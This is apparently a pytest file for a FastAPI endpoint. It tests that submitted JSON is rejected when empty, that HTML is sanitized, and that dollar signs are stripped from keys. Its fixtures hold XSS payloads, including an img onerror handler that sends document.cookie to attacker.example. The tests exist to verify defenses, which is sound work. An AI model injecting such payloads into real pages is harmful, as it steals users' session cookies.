from fastapi.testclient import TestClient
from unittest.mock import MagicMock, patch

from src.main import app

client = TestClient(app)

malicious = {
  "username": "<script>alert('XSS')</script>",
  "profile": {
    "avatar": "data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'></svg>",
    "bio": "<img src=x onerror=fetch('https://attacker.example/steal?cookie=' + document.cookie)>"
  }}


def test_store_rejects_empty_payload():
    # Patch the storage backend to ensure it is not called
    with patch('src.main.payload_storage.store') as mock_store:
        response = client.post('/payloads', json={})
        assert response.status_code == 400
        body = response.json()
        assert isinstance(body, dict)
        assert 'detail' in body
        assert 'Empty JSON body' in body['detail']
        mock_store.assert_not_called()

def test_store_sanitizes_payload():
    malicious = {
        "username": "<script>alert('XSS')</script>",
        "profile": {
            "avatar": "data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'></svg>",
            "bio": "<img src=x onerror=fetch('https://attacker.example/steal?cookie=' + document.cookie)>"
        }
    }

    with patch('src.main.payload_storage.store') as mock_store:
        mock_store.return_value = {}
                
        response = client.post('/payloads', json=malicious)
        assert response.status_code == 201
        mock_store.assert_called_once()
        mock_store.assert_called_with({
            'username': '', 
            'profile': {
                'avatar': 'data:image/svg+xml,', 
                'bio': '<img src="x">'
            }
        })      

def test_store_removes_dollar_sign_from_keys():
    payload_with_dollar_in_key = {
        "$username": "Joe",
    }

    with patch('src.main.payload_storage.store') as mock_store:
        mock_store.return_value = {}
                
        response = client.post('/payloads', json=payload_with_dollar_in_key)
        assert response.status_code == 201
        mock_store.assert_called_once()
        mock_store.assert_called_with({
            'username': 'Joe', 
        })      

